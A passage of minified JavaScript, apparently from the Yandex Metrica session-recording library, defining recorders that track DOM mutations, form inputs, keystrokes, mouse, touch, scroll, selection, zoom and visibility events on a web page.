                var r = t.attributeName,
                  i = t.removedNodes,
                  o = t.oldValue,
                  a = t.target,
                  u = t.nextSibling,
                  c = t.previousSibling;
                switch (t.type) {
                  case "attributes":
                    n.kd(t);
                    var s = e(a);
                    s.Bd[r] || (s.Bd[r] = D(n.b, a, r, o, n.D.tc()).value);
                    break;
                  case "childList":
                    i &&
                      zu(function (t) {
                        (s = e(t)).qf ||
                          Nu(s, { qf: a, Mh: u || void 0, Nh: c || void 0 });
                      }, Zi(i));
                    break;
                  case "characterData":
                    (s = e(a)).rf || (s.rf = o);
                }
              }, t);
              var o = this.D.ma();
              zu(function (t, e) {
                o.Ce(t, i[e]);
              }, r);
            }),
            (e.prototype.ce = function (t) {
              var e = this;
              if (yv(this.b)) {
                var n = this.D.K();
                this.vd(t),
                  zu(function (t) {
                    var r = t.addedNodes,
                      i = t.removedNodes,
                      o = t.target;
                    switch (t.type) {
                      case "childList":
                        i && i.length && e.te(Zi(i), n),
                          r && r.length && e.se(Zi(r), n);
                        break;
                      case "characterData":
                        e.qe(o, n);
                    }
                  }, t),
                  this.pe(n);
              } else this.stop();
            }),
            (e.prototype.pe = function (t) {
              var e = this;
              zu(function (n, r) {
                var i = e.sc();
                e.D.V(
                  "mutation",
                  { index: i, attributes: e.ja.attributes[r], target: e.X(n) },
                  "ac",
                  t
                );
              }, this.ja.elements),
                (this.ja.elements = []),
                (this.ja.attributes = []);
            }),
            (e.prototype.se = function (t, e) {
              var n = this,
                r = this.sc();
              this.D.ma().yc({
                ga: t,
                Zc: function (t) {
                  (t = Vu(function (t) {
                    return delete (t = Nu({}, t)).node, t;
                  }, t)),
                    n.D.V("mutation", { index: r, ga: t }, "ad", e);
                },
              });
            }),
            (e.prototype.te = function (t, e) {
              var n = this,
                r = this.sc(),
                i = this.D.ma(),
                o = Vu(function (t) {
                  var e = i.removeNode(t);
                  return (
                    W(n.b, t, function (t) {
                      i.removeNode(t);
                    }),
                    e
                  );
                }, t);
              this.D.V("mutation", { index: r, ga: o }, "re", e);
            }),
            (e.prototype.qe = function (t, e) {
              var n = this.sc();
              this.D.V(
                "mutation",
                { value: t.textContent, target: this.X(t), index: n },
                "tc",
                e
              );
            }),
            (e.prototype.sc = function () {
              var t = this.index;
              return (this.index += 1), t;
            }),
            e
          );
        })(mv),
        Ev = (function () {
          function t(t, e) {
            var n = this;
            (this.nc = []),
              (this.Za = []),
              (this.$d = 1),
              (this.Ga = 0),
              (this.ib = {}),
              (this.Bc = {}),
              (this.Md = function (t) {
                return !!n.Za.length && Fu(t, n.Za);
              }),
              (this.removeNode = function (t) {
                var e = n.X(t),
                  r = bi(t);
                if (r)
                  return (
                    (r = "NR:" + r.toLowerCase()),
                    n.Md(r) && n.Z.O(r, { data: { node: t, id: e } }),
                    e
                  );
              }),
              (this.cb = function (t) {
                var e = bi(t);
                if (e) {
                  var r = t.__ym_indexer;
                  return (
                    r ||
                      ((r = n.$d),
                      (t.__ym_indexer = r),
                      (n.$d += 1),
                      (e = "NA:" + e.toLowerCase()),
                      n.Md(e) && n.Z.O(e, { data: { node: t, id: r } })),
                    r
                  );
                }
                return null;
              }),
              (this.b = t);
            var r = P(t, this, "i");
            (this.Z = Fr(t)),
              (this.options = e),
              (this.start = r.G(this.start, "st")),
              (this.stop = r.G(this.stop, "sp")),
              (this.X = r.G(this.X, "i")),
              (this.Ce = r.G(this.Ce, "o")),
              (this.yc = r.G(this.yc, "a")),
              (this.removeNode = r.G(this.removeNode, "r")),
              (this.ca = r.G(this.ca, "s"));
          }
          return (
            (t.prototype.Ce = function (t, e) {
              var n = this.cb(t);
              mu(n) || (this.Bc[n] && this.X(t), (this.Bc[n] = e));
            }),
            (t.prototype.C = function (t, e, n) {
              (t = "" + e + t),
                this.Za.push(t),
                this.Md(t) || this.Za.push(t),
                this.Z.C([t], n);
            }),
            (t.prototype.da = function (t, e, n) {
              var r = "" + e + t;
              (this.Za = Lu(function (t) {
                return t !== r;
              }, this.Za)),
                this.Z.da([r], n);
            }),
            (t.prototype.start = function () {
              this.Ga = Br(
                this.b,
                po(yu(this.ca, this, !1), this.start),
                50,
                "i.s"
              );
            }),
            (t.prototype.stop = function () {
              this.flush(), ro(this.b, this.Ga), (this.nc = []);
            }),
            (t.prototype.yc = function (t) {
              var e = this,
                n = [],
                r = 0,
                i = { Zc: t.Zc, result: [], Ac: 0, ga: n };
              this.nc.push(i),
                zu(function (t) {
                  W(e.b, t, function (t) {
                    var o = e.cb(t);
                    mu(o) ||
                      (n.push(t),
                      e.ib[o] && e.X(t),
                      (e.ib[o] = { node: t, event: i, Ij: r }),
                      (r += 1));
                  });
                }, t.ga);
            }),
            (t.prototype.X = function (t) {
              if (t === this.b) return 0;
              var e = this.cb(t),
                n = this.ib[e],
                r = this.Qh(e),
                i = r.qf,
                o = r.Bd,
                a = r.rf,
                u = r.Mh,
                c = r.Nh;
              if (n) {
                (r = n.event), (n = n.Ij);
                var s = this.b.document.documentElement === t;
                u = u || t.nextSibling;
                var f = c || t.previousSibling;
                (c = !s && u ? this.cb(u) : null),
                  (f = !s && f ? this.cb(f) : null),
                  (s = this.b),
                  (u = this.options),
                  (i = this.cb(i || t.parentNode || t.parentElement) || 0);
                var h = o,
                  l = void 0;
                if (
                  (void 0 === f && (f = null),
                  void 0 === c && (c = null),
                  void 0 === h && (h = {}),
                  void 0 === l && (l = bi(t)),
                  gu(l)
                    ? (t = void 0)
                    : ((o = {
                        id: e,
                        oe: f !== i ? f : null,
                        next: c !== i ? c : null,
                        parent: i,
                        name: l.toLowerCase(),
                        node: t,
                      }),
                      Mi(t)
                        ? ((a = (function (t, e) {
                            if (No(e)) return e;
                            var n = t.textContent;
                            return No(n) ||
                              No((n = t.data)) ||
                              No((n = t.nodeValue))
                              ? n
                              : "";
                          })(t, a)),
                          (o.attributes = {}),
                          (o.content = a) &&
                            (t = _t(s, t)) &&
                            ((o.content =
                              "" !== a.trim()
                                ? (function (t, e) {
                                    return iu(
                                      "",
                                      Vu(function (e) {
                                        return t.isNaN(e)
                                          ? qd.test(e)
                                            ? ((e =
                                                e.toUpperCase() === e
                                                  ? Kd
                                                  : Wd),
                                              String.fromCharCode(
                                                Ki(t, e[0], e[1])
                                              ))
                                            : e
                                          : "" + Ki(t, 0, 9);
                                      }, e.split(""))
                                    );
                                  })(s, a)
                                : a),
                            (o.hidden = t)))
                        : ((s = (a = N(s, t, u, h, l)).gb),
                          (o.attributes = a.ah),
                          s && (o.hidden = s),
                          t.namespaceURI &&
                            Ro(t.namespaceURI, "svg") &&
                            (o.Qf = t.namespaceURI)),
                      (t = o)),
                  gu(t))
                )
                  return;
                delete this.ib[e],
                  (r.result[n] = t),
                  (r.Ac += 1),
                  r.ga.length === r.Ac && r.Zc(r.result);
              }
              return e;
            }),
            (t.prototype.flush = function () {
              this.ca(!0);
            }),
            (t.prototype.ca = function (t) {
              var e = this;
              if (yv(this.b)) {
                var n = Mu(this.ib);
                (n = Qn(
                  (n = Vu(function (t) {
                    return e.ib[t].node;
                  }, n)),
                  this.X
                ))((t = t ? Ef(qo) : er(this.b, 20))),
                  (this.nc = Lu(function (t) {
                    return t.Ac !== t.result.length;
                  }, this.nc));
              }
            }),
            (t.prototype.Qh = function (t) {
              if (mu(t)) return {};
              var e = this.Bc[t];
              return e ? (delete this.Bc[t], e) : {};
            }),
            t
          );
        })(),
        xv = ["input", "change", "keyup", "paste", "cut"],
        Cv = (function (t) {
          function e(e, n, r) {
            return (
              ((e = t.call(this, e, n, r) || this).inputs = {}),
              (e.xd = !1),
              (e.Lc = e.J.G(e.Lc, "ii")),
              (e.Mc = e.J.G(e.Mc, "ir")),
              (e.Sc = e.J.G(e.Sc, "ri")),
              (e.gd = e.J.G(e.gd, "ur")),
              (e.Ld = e.J.G(e.Ld, "ce")),
              (e.xc = e.J.G(e.xc, "vc")),
              e
            );
          }
          return (
            Jo(e, t),
            (e.prototype.start = function () {
              var t = this,
                e = this.D.ma();
              (this.xd = this.kh()),
                zu(function (n) {
                  (n = n.toLowerCase()),
                    e.C(n, "NA:", yu(t.Lc, t)),
                    e.C(n, "NR:", yu(t.Mc, t));
                }, Rs),
                (this.Ib = [
                  this.Xa.C(this.b.document, xv, yu(this.Ld, this)),
                  function () {
                    zu(function (n) {
                      (n = n.toLowerCase()),
                        e.da(n, "NA:", t.Lc),
                        e.da(n, "NR:", t.Mc);
                    }, Rs),
                      zu(t.gd, Mu(t.inputs));
                  },
                ]);
            }),
            (e.prototype.gd = function (t) {
              if (this.xd) {
                var e = this.inputs[t];
                e &&
                  ((t = e.aj),
                  (e = e.element),
                  t && this.b.Object.defineProperty(e, this.uc(e), t));
              }
            }),
            (e.prototype.Mc = function (t) {
              t && this.gd(t.data.id);
            }),
            (e.prototype.Lc = function (t) {
              t && ((t = t.data), this.Sc(t.node, t.id));
            }),
            (e.prototype.uc = function (t) {
              return ks(t) ? "checked" : "value";
            }),
            (e.prototype.Ld = function (t) {
              if ((t = t.target)) {
                var e = this.uc(t);
                this.xc(t[e], t);
              }
            }),
            (e.prototype.xc = function (t, e) {
              var n = this.X(e),
                r = this.inputs[n];
              if (r || (r = this.Sc(r, n))) {
                n = r.mh;
                var i = r.value,
                  o = this.uc(e);
                (t && !Fu(typeof t, ["string", "boolean", "number"])) ||
                  t === i ||
                  ((i = D(this.b, e, o, t, this.D.tc()).value),
                  n
                    ? this.D.V(
                        "event",
                        { target: this.X(e), checked: !!t },
                        "change"
                      )
                    : ((n = At(e)),
                      (o = wt(e)),
                      this.D.V(
                        "event",
                        { value: i, hidden: o && !n, target: this.X(e) },
                        "change"
                      )),
                  (r.value = t));
              }
            }),
            (e.prototype.Sc = function (t, e) {
              var n = this;
              if (
                !xt(t) ||
                "__ym_input_override_test" === t.getAttribute("class") ||
                this.inputs[e]
              )
                return null;
              var r = ks(t),
                i = this.uc(t),
                o = { element: t, mh: r, value: t[i] };
              return (
                (this.inputs[e] = o),
                this.xd &&
                  qn(this.b, function () {
                    var e =
                        n.b.Object.getOwnPropertyDescriptor(
                          Object.getPrototypeOf(t),
                          i
                        ) || {},
                      r = n.b.Object.getOwnPropertyDescriptor(t, i) || {},
                      a = Nu({}, e, r);
                    if (zo("((set)?(\\s?" + i + ")?)?", a.set)) {
                      try {
                        n.b.Object.defineProperty(
                          t,
                          i,
                          Nu({}, a, {
                            configurable: !0,
                            set: function (t) {
                              return n.xc(t, this), a.set.call(this, t);
                            },
                          })
                        );
                      } catch (t) {}
                      o.aj = a;
                    }
                  }),
                o
              );
            }),
            (e.prototype.kh = function () {
              var t = !0,
                e = Es(this.b)("input");
              try {
                ((e = Es(this.b)("input")).value = "INPUT_VALUE"),
                  e.style.setProperty("display", "none", "important"),
                  e.setAttribute("type", "text"),
                  e.setAttribute("class", "__ym_input_override_test");
                var n =
                    this.b.Object.getOwnPropertyDescriptor(
                      Object.getPrototypeOf(e),
                      "value"
                    ) || {},
                  r = this.b.Object.getOwnPropertyDescriptor(e, "value") || {},
                  i = Nu({}, n, r);
                this.b.Object.defineProperty(
                  e,
                  "value",
                  Nu({}, i, {
                    configurable: !0,
                    set: function (t) {
                      return i.set.call(e, t);
                    },
                  })
                ),
                  "INPUT_VALUE" !== e.value && (t = !1),
                  (e.value = "INPUT_TEST"),
                  "INPUT_TEST" !== e.value && (t = !1);
              } catch (e) {
                t = !1;
              }
              return t;
            }),
            e
          );
        })(mv),
        Av = (function (t) {
          function e(e, n, r) {
            return (
              ((e = t.call(this, e, n, r) || this).Pa = {
                width: 0,
                height: 0,
                lb: 0,
                mb: 0,
                orientation: 0,
              }),
              e.fa.push([["resize"], e.Zi]),
              e.fa.push([["orientationchange"], e.Xi]),
              e
            );
          }
          return (
            Jo(e, t),
            (e.prototype.start = function () {
              t.prototype.start.call(this), this.ig();
            }),
            (e.prototype.Zi = function () {
              var t = this.Kd();
              this.oi(t) && ((this.Pa = t), this.jg(t));
            }),
            (e.prototype.Xi = function () {
              var t = this.Kd();
              this.Pa.orientation !== t.orientation &&
                ((this.Pa = t), this.sj(t));
            }),
            (e.prototype.Nf = function (t) {
              return !(t.height && t.width && t.mb && t.lb);
            }),
            (e.prototype.oi = function (t) {
              return t.height !== this.Pa.height || t.width !== this.Pa.width;
            }),
            (e.prototype.Kd = function () {
              var t = this.D.bb(),
                e = Ci(this.b);
              return {
                width: e[0],
                height: (e = e[1]),
                mb: (t = t.Jd()) ? t.scrollWidth : 0,
                lb: t ? t.scrollHeight : 0,
                orientation: this.D.bb().Yh(),
              };
            }),
            (e.prototype.sj = function (t) {
              var e;
              void 0 === e && (e = this.D.K()),
                this.D.V(
                  "event",
                  {
                    width: t.width,
                    height: t.height,
                    orientation: t.orientation,
                  },
                  "deviceRotation",
                  e
                );
            }),
            (e.prototype.jg = function (t, e) {
              void 0 === e && (e = this.D.K()),
                this.D.V(
                  "event",
                  { width: t.width, height: t.height, mb: t.mb, lb: t.lb },
                  "resize",
                  e
                );
            }),
            (e.prototype.ig = function () {
              var t = this.Kd();
              this.Nf(t)
                ? Br(this.b, yu(this.ig, this), 300)
                : (this.Nf(this.Pa) && (this.Pa = t), this.jg(t, 0));
            }),
            e
          );
        })(mv),
        _v = (function () {
          function t(t) {
            (this.index = 0), (this.rb = {}), (this.b = t);
          }
          return (
            (t.prototype.dc = function (t, e, n) {
              void 0 === n && (n = {});
              var r = mf(this.b),
                i = this.index;
              (this.index += 1),
                (this.rb[i] = { Ga: 0, Pb: !1, Kh: t, Xb: [], Vd: r(gr) });
              var o = this;
              return function () {
                var a = Oo(arguments),
                  u = n.$a && !o.rb[i].Pb,
                  c = o.rb[i];
                ro(o.b, c.Ga), (c.Xb = a), (c.Pb = !0);
                var s = r(gr);
                (u || s - c.Vd >= e) && (t.apply(void 0, a), (c.Vd = s)),
                  (c.Ga = Br(
                    o.b,
                    function () {
                      u || (t.apply(void 0, a), (c.Vd = r(gr))),
                        (c.Pb = !1),
                        (c.Xb = []);
                    },
                    e,
                    "th"
                  ));
              };
            }),
            (t.prototype.flush = function () {
              var t = this;
              zu(function (e) {
                var n = t.rb[e],
                  r = n.Ga,
                  i = n.Kh,
                  o = n.Xb;
                n.Pb && ((t.rb[e].Pb = !1), i.apply(void 0, o), ro(t.b, r));
              }, Mu(this.rb));
            }),
            t
          );
        })(),
        kv = (function (t) {
          function e(e, n, r) {
            return (
              ((n = t.call(this, e, n, r) || this).xg = []),
              (n.Re = { x: 0, y: 0 }),
              (n.ta = new _v(e)),
              (n.Pc = n.J.G(n.Pc, "o")),
              n.fa.push([["scroll"], n.$i]),
              n
            );
          }
          return (
            Jo(e, t),
            (e.prototype.start = function () {
              t.prototype.start.call(this),
                this.D.V(
                  "event",
                  {
                    x: Math.max(this.b.scrollX, 0),
                    y: Math.max(this.b.scrollY, 0),
                    page: !0,
                    target: -1,
                  },
                  "scroll",
                  0
                );
            }),
            (e.prototype.stop = function () {
              t.prototype.stop.call(this), this.ta.flush();
            }),
            (e.prototype.$i = function (t) {
              if (this.D.bb().Gf()) this.Pc(t);
              else {
                var e = t.target,
                  n = Lu(function (t) {
                    return t[0] === e;
                  }, this.xg).pop();
                n
                  ? (n = n[1])
                  : ((n = this.ta.dc(yu(this.Pc, this), 100, { $a: !0 })),
                    this.xg.push([e, n])),
                  n(t);
              }
            }),
            (e.prototype.Pc = function (t) {
              var e = this.D.bb().Jd();
              t = t.target;
              var n = this.Cb(t);
              e = Wu(ou(t), [e, this.b, this.b.document]);
              var r = Math.max(n.left, 0);
              if (((n = Math.max(n.top, 0)), e)) {
                if (this.Re.x === r && this.Re.y === n) return;
                this.Re = { x: r, y: n };
              }
              this.D.V(
                "event",
                { x: r, y: n, page: e, target: e ? -1 : this.X(t) },
                "scroll"
              );
            }),
            (e.prototype.Cb = function (t) {
              var e = { left: 0, top: 0 };
              if (!t) return e;
              if (t.window === t)
                return { top: t.scrollY || 0, left: t.scrollX || 0 };
              var n = t.ownerDocument || t,
                r = t.documentElement,
                i = n.defaultView || n.parentWindow,
                o = n.body;
              return t !== n || (t = this.D.bb().Jd())
                ? Fu(t, [r, o])
                  ? {
                      top: t.scrollTop || i.scrollY,
                      left: t.scrollLeft || i.scrollX,
                    }
                  : { top: t.scrollTop || 0, left: t.scrollLeft || 0 }
                : e;
            }),
            e
          );
        })(mv),
        Tv = ["mousemove", "mousedown", "mouseup", "click"],
        Sv = (function (t) {
          function e(e, n, r) {
            return (
              (n = t.call(this, e, n, r) || this).fa.push([Tv, n.Wi]),
              (n.ta = new _v(e)),
              (n.Ic = n.J.G(n.Ic, "n")),
              (n.zj = n.J.G(n.ta.dc(yu(n.Ic, n), 100), "t")),
              n
            );
          }
          return (
            Jo(e, t),
            (e.prototype.stop = function () {
              t.prototype.stop.call(this), this.ta.flush();
            }),
            (e.prototype.Wi = function (t) {
              var e = null;
              try {
                e = t.type;
              } catch (t) {
                return;
              }
              "mousemove" === e ? this.zj(t) : this.Ic(t);
            }),
            (e.prototype.Ic = function (t) {
              var e = t.type,
                n = t.clientX;
              n = void 0 === n ? null : n;
              var r = t.clientY;
              (r = void 0 === r ? null : r),
                (t = t.target || this.b.document.elementFromPoint(n, r)),
                this.D.V(
                  "event",
                  { x: n || 0, y: r || 0, target: this.X(t) },
                  e
                );
            }),
            e
          );
        })(mv),
        Rv = ["focus", "blur"],
        Mv = (function (t) {
          function e(e, n, r) {
            return (e = t.call(this, e, n, r) || this).fa.push([Rv, e.Lh]), e;
          }
          return (
            Jo(e, t),
            (e.prototype.Lh = function (t) {
              var e = t.target;
              (t = t.type),
                this.D.V(
                  "event",
                  {
                    target: this.X(
                      e === this.b ? this.b.document.documentElement : e
                    ),
                  },
                  t
                );
            }),
            e
          );
        })(mv),
        Nv = po(
          Io(function (t) {
            var e = Vo(t.getSelection, "getSelection");
            return e ? yu(e, t) : qo;
          }),
          Wo
        ),
        Dv = ["mousemove", "touchmove", "mousedown", "touchdown", "select"],
        Pv = /text|search|password|tel|url/,
        Iv = (function (t) {
          function e(e, n, r) {
            return (
              ((e = t.call(this, e, n, r) || this).Nd = !1),
              e.fa.push([Dv, e.ki]),
              e
            );
          }
          return (
            Jo(e, t),
            (e.prototype.ki = function (t) {
              var e = this.D,
                n = t.type,
                r = t.which;
              (t = t.target),
                ("mousemove" === n && 1 !== r) ||
                  ((n = "select" === n ? this.bi(t) : this.$h()) &&
                  n.start !== n.end
                    ? ((this.Nd = !0), e.V("event", n, "selection"))
                    : this.Nd &&
                      ((this.Nd = !1),
                      e.V("event", { start: 0, end: 0 }, "selection")));
            }),
            (e.prototype.$h = function () {
              var t = Nv(this.b);
              if (t && 0 < t.rangeCount) {
                t = t.getRangeAt(0) || this.b.document.createRange();
                var e = this.X(t.startContainer),
                  n = this.X(t.endContainer);
                if (!gu(e) && !gu(n))
                  return {
                    start: t.startOffset,
                    end: t.endOffset,
                    rg: e,
                    hf: n,
                  };
              }
            }),
            (e.prototype.bi = function (t) {
              if (Pv.test(t.type || "")) {
                var e = this.X(t);
                if (!gu(e))
                  return {
                    start: t.selectionStart,
                    end: t.selectionEnd,
                    target: e,
                  };
              }
            }),
            e
          );
        })(mv),
        Ov = { focus: "windowfocus", blur: "windowblur" },
        Lv = (function (t) {
          function e(e, n, r) {
            return (
              ((e = t.call(this, e, n, r) || this).visibility = null),
              gu(e.b.document.hidden)
                ? gu(e.b.document.msHidden)
                  ? gu(e.b.document.webkitHidden) ||
                    (e.visibility = {
                      hidden: "webkitHidden",
                      event: "webkitvisibilitychange",
                    })
                  : (e.visibility = {
                      hidden: "msHidden",
                      event: "msvisibilitychange",
                    })
                : (e.visibility = {
                    hidden: "hidden",
                    event: "visibilitychange",
                  }),
              (e.handleEvent = e.J.G(e.handleEvent, "e")),
              e
            );
          }
          return (
            Jo(e, t),
            (e.prototype.start = function () {
              this.Ib = [
                this.Xa.C(
                  this.b,
                  this.visibility ? [this.visibility.event] : ["focus", "blur"],
                  yu(this.handleEvent, this)
                ),
              ];
            }),
            (e.prototype.handleEvent = function (t) {
              this.D.V(
                "event",
                {},
                Ov[
                  this.visibility
                    ? this.b.document[this.visibility.hidden]
                      ? "blur"
                      : "focus"
                    : t.type
                ]
              );
            }),
            e
          );
        })(mv),
        jv = [
          "touchmove",
          "touchstart",
          "touchend",
          "touchcancel",
          "touchforcechange",
        ],
        Bv = (function (t) {
          function e(e, n, r) {
            return (
              ((n = t.call(this, e, n, r) || this).dd = {}),
              (n.scrolling = !1),
              (n.gg = 0),
              n.fa.push([["scroll"], n.pj, n.b.document]),
              n.fa.push([jv, n.Dj, n.b.document]),
              (n.ta = new _v(e)),
              (n.Hb = n.J.G(n.Hb, "nh")),
              (n.Aj = n.J.G(
                n.ta.dc(n.Hb, n.D.bb().Gf() ? 0 : 50, { $a: !0 }),
                "th"
              )),
              n
            );
          }
          return (
            Jo(e, t),
            (e.prototype.pj = function () {
              var t = this;
              (this.scrolling = !0),
                ro(this.b, this.gg),
                (this.gg = Br(
                  this.b,
                  function () {
                    t.scrolling = !1;
                  },
                  150
                ));
            }),
            (e.prototype.Dj = function (t) {
              var e = this,
                n = "touchcancel" === t.type || "touchend" === t.type;
              t.changedTouches &&
                0 < t.changedTouches.length &&
                zu(function (t) {
                  var r = e.fi(t);
                  (t.__ym_touch_id = r), n && delete e.dd[t.identifier];
                }, Zi(t.changedTouches)),
                "touchmove" === t.type
                  ? this.scrolling
                    ? this.Hb(t)
                    : this.Aj(t, this.D.K())
                  : this.Hb(t);
            }),
            (e.prototype.fi = function (t) {
              return (
                this.dd[t.identifier] || (this.dd[t.identifier] = R()),
                this.dd[t.identifier]
              );
            }),
            (e.prototype.Hb = function (t, e) {
              void 0 === e && (e = this.D.K());
              var n = t.type,
                r = Vu(function (t) {
                  return {
                    id: t.__ym_touch_id,
                    x: Math.round(t.clientX),
                    y: Math.round(t.clientY),
                    force: t.force,
                  };
                }, Zi(t.changedTouches));
              0 < r.length &&
                this.D.V(
                  "event",
                  { touches: r, target: this.X(t.target) },
                  n,
                  e
                );
            }),
            e
          );
        })(mv),
        Fv = (function (t) {
          function e(e, n, r) {
            return (
              (e = t.call(this, e, n, r) || this).fa.push([
                ["load"],
                e.Vi,
                e.b.document,
              ]),
              e
            );
          }
          return (
            Jo(e, t),
            (e.prototype.Vi = function (t) {
              "IMG" === bi((t = t.target)) &&
                t.getAttribute("srcset") &&
                this.D.V(
                  "event",
                  { target: this.X(t), value: t.currentSrc },
                  "srcset"
                );
            }),
            e
          );
        })(mv),
        Gv = (function (t) {
          function e(e, n, r) {
            return (
              ((n = t.call(this, e, n, r) || this).Kg = 1),
              (n.ta = new _v(e)),
              (n.Zb = n.J.G(n.Zb, "z")),
              n
            );
          }
          return (
            Jo(e, t),
            (e.prototype.start = function () {
              if (this.Bf()) {
                t.prototype.start.call(this), this.Zb();
                var e = this.Xa.C(
                  mo(this.b, "visualViewport"),
                  ["resize"],
                  this.ta.dc(this.Zb, 10)
                );
                this.Ib.push(e);
              }
            }),
            (e.prototype.stop = function () {
              t.prototype.stop.call(this), this.ta.flush();
            }),
            (e.prototype.Zb = function () {
              var t = this.Bf();
              t && t !== this.Kg && ((this.Kg = t), this.tj(t));
            }),
            (e.prototype.Bf = function () {
              var t = Ai(this.b);
              return t ? t[2] : null;
            }),
            (e.prototype.tj = function (t) {
              var e = xi(this.b);
              this.D.V("event", { x: e.x, y: e.y, level: t }, "zoom");
            }),
            e
          );
        })(mv),
        Hv = {
          91: "super",
          93: "super",
          224: "super",
          18: "alt",
          17: "ctrl",
          16: "shift",
          9: "tab",
          8: "backspace",
          46: "delete",
        },
        Uv = { super: 1, jk: 2, alt: 3, shift: 4, Ik: 5, delete: 6, gk: 6 },
        Xv = [4, 9, 8, 32, 37, 38, 39, 40, 46],
        Vv =
          (((ed = {})[1] = {
            91: "&#8984;",
            93: "&#8984;",
            224: "&#8984;",
            18: "&#8997;",
            17: "&#8963;",
            16: "&#8679;",
            9: "&#8677;",
            8: "&#9003;",
            46: "&#9003;",
          }),
          (ed[2] = {
            91: "&#xff;",
            93: "&#xff;",
            224: "&#xff;",
            18: "Alt",
            17: "Ctrl",
            16: "Shift",
            9: "Tab",
            8: "Backspace",
            46: "Delete",
          }),
          (ed.Ji = {
            32: "SPACEBAR",
            37: "&larr;",
            38: "&uarr;",
            39: "&rarr;",
            40: "&darr;",
            13: "Enter",
          }),
          ed),
        zv = /flash/,
        Yv = /ym-disable-keys/,
        qv = /^&#/,
        Kv = (function (t) {
          function e(e, n, r) {
            return (
              ((n = t.call(this, e, n, r) || this).eb = {}),
              (n.Ca = 0),
              (n.xa = []),
              (n.vg = []),
              (n.kc = 0),
              (n.bg = 0),
              n.fa.push([["keydown"], n.hi]),
              n.fa.push([["keyup"], n.ii]),
              (n.Sg =
                -1 !== (mo(e, "navigator.appVersion") || "").indexOf("Mac")
                  ? "1"
                  : "2"),
              (n.Ec = n.J.G(n.Ec, "v")),
              (n.zd = n.J.G(n.zd, "ec")),
              (n.Yc = n.J.G(n.Yc, "sk")),
              (n.Id = n.J.G(n.Id, "gk")),
              (n.Ee = n.J.G(n.Ee, "sc")),
              (n.Yb = n.J.G(n.Yb, "cc")),
              (n.reset = n.J.G(n.reset, "r")),
              (n.Uc = n.J.G(n.Uc, "rs")),
              n
            );
          }
          return (
            Jo(e, t),
            (e.prototype.hi = function (t) {
              if (this.Ec(t) && !this.Ai(t)) {
                var e = t.keyCode;
                t.repeat ||
                  this.eb[e] ||
                  ((this.eb[t.keyCode] = !0),
                  Hv[t.keyCode] && !this.Ca
                    ? ((this.Ca += 1), this.Ee(t), this.reset(300))
                    : this.Ca
                    ? (this.hh(), this.ve(t), this.zd())
                    : (this.reset(), this.ve(t)));
              }
            }),
            (e.prototype.ii = function (t) {
              if (this.Ec(t)) {
                var e = t.keyCode,
                  n = Hv[t.keyCode];
                this.eb[t.keyCode] && (this.eb[e] = !1),
                  n && this.Ca && ((this.Ca = 0), (this.eb = {})),
                  1 === this.xa.length &&
                    ((t = this.xa[0]),
                    Fu(t.keyCode, Xv) && (this.Yc([t], !0), this.reset())),
                  (this.xa = Lu(po(ou(e), Fo), this.xa)),
                  ro(this.b, this.kc);
              }
            }),
            (e.prototype.Ec = function (t) {
              var e = this.b.document.activeElement;
              return (
                (t = t.target),
                !Wu(Boolean, [
                  e &&
                    "OBJECT" === e.nodeName &&
                    zv.test(e.getAttribute("type") || ""),
                  "INPUT" === t.nodeName &&
                    "password" === t.getAttribute("type") &&
                    Yv.test(t.className),
                ])
              );
            }),
            (e.prototype.zd = function () {
              (this.vg = this.xa.slice(0)),
                ro(this.b, this.kc),
                (this.kc = Br(
                  this.b,
                  wo(this.vg, yu(this.Yc, this)),
                  0,
                  "e.c"
                ));
            }),
            (e.prototype.Yc = function (t, e) {
              if ((void 0 === e && (e = !1), 1 < t.length || e)) {
                var n = this.Id(t);
                this.D.V("event", { Fc: n }, "keystroke");
              }
            }),
            (e.prototype.Id = function (t) {
              var e = this;
              return $i(
                function (t, e) {
                  return (Uv[t.Gc] || 100) - (Uv[e.Gc] || 100);
                },
                (t = Vu(function (t) {
                  t = t.keyCode;
                  var n = Hv[t],
                    r = e.Xh(t);
                  return { id: t, key: r, Kf: !!n && qv.test(r), Gc: n };
                }, t))
              );
            }),
            (e.prototype.Xh = function (t) {
              return Vv[this.Sg][t] || Vv.Ji[t] || String.fromCharCode(t);
            }),
            (e.prototype.ve = function (t) {
              Fu(t, this.xa) || this.xa.push(t);
            }),
            (e.prototype.Ee = function (t) {
              this.ve(t), this.Yb();
            }),
            (e.prototype.Yb = function () {
              this.Ca ? Br(this.b, this.Yb, 100) : (this.xa = []);
            }),
            (e.prototype.hh = function () {
              ro(this.b, this.bg);
            }),
            (e.prototype.reset = function (t) {
              t ? (this.bg = Br(this.b, yu(this.Uc, this), t)) : this.Uc();
            }),
            (e.prototype.Uc = function () {
              (this.Ca = 0),
                (this.xa = []),
                (this.eb = {}),
                ro(this.b, this.kc);
            }),
            (e.prototype.Ai = function (t) {
              return (
                !(!t.target || "INPUT" !== t.target.nodeName) &&
                (t.shiftKey || 32 === t.keyCode || "shift" === Hv[t.keyCode])
              );
            }),
            e
          );
        })(mv),
        Wv = ["sr", "sd", "н"],
        Jv = /allow-same-origin/,
        $v = (function (t) {
          function e(e, n, r) {
            return (
              ((e = t.call(this, e, n, r) || this).Qb = []),
              (e.Dd = {}),
              (e.de = e.J.G(e.de, "fi")),
              (e.ee = e.J.G(e.ee, "sd")),
              (e.fe = e.J.G(e.fe, "src")),
              (e.qa = new MutationObserver(e.fe)),
              e
            );
          }
          return (
            Jo(e, t),
            (e.prototype.start = function () {
              t.prototype.start.call(this),
                this.D.tc().wb &&
                  this.D.ma().C("iframe", "NA:", yu(this.de, this)),
                this.D.xf().Gd().C(["sdr"], yu(this.ee, this));
            }),
            (e.prototype.stop = function () {
              t.prototype.stop.call(this),
                zu(function (t) {
                  t.D.stop();
                }, this.Qb);
            }),
            (e.prototype.fe = function (t) {
              var e = t.pop().target;
              if (
                (t = Bu(function (t) {
                  return t.Ff === e;
                }, this.Qb))
              ) {
                this.Qb = Lu(function (t) {
                  return t.Ff !== e;
                }, this.Qb);
                var n = t.D.Hd();
                try {
                  t.D.stop();
                } catch (t) {}
                this.cc(e, n);
              }
            }),
            (e.prototype.de = function (t) {
              if (t) {
                var e = t.data.node;
                this.qa.observe(e, {
                  attributes: !0,
                  attributeFilter: ["src"],
                }),
                  this.cc(e, t.data.id);
              }
            }),
            (e.prototype.cc = function (t, e) {
              var n = this;
              this.xi(t) &&
                Z(this.b, t)
                  .then(function () {
                    var r = n.D.cc(t.contentWindow, e);
                    n.Qb.push({ D: r, Ff: t });
                  })
                  .catch(qo);
            }),
            (e.prototype.ee = function (t) {
              var e = this,
